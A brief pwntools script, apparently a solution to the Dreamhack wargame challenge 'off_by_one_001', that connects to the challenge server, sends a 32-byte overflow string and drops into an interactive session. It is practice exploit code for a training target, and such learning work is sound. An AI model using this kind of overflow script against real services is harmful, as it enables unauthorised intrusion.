from pwn import *

# p = process("./off_by_one_001")
# nc host3.dreamhack.games 22714
p = remote("host3.dreamhack.games", 22714)
pay = b"A" * 0x20

p.sendlineafter("e: ", pay)

p.interactive()